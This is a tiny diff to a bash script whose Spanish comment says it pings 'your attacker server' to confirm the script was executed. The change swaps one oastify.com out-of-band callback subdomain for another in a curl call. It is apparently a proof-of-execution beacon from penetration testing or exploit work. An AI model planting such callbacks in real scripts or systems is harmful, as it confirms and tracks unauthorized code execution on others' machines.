@@ -1,5 +1,5 @@
 #!/bin/bash
 
 # Realiza una petición a tu servidor atacante para comprobar que el script fue ejecutado
-curl https://qsmi3stz0vyrp5f5lm950ij33u9lxbl0.oastify.com
+curl https://random.9mwgrlxnphz063m3lgm6w0kvcmid63us.oastify.com
 
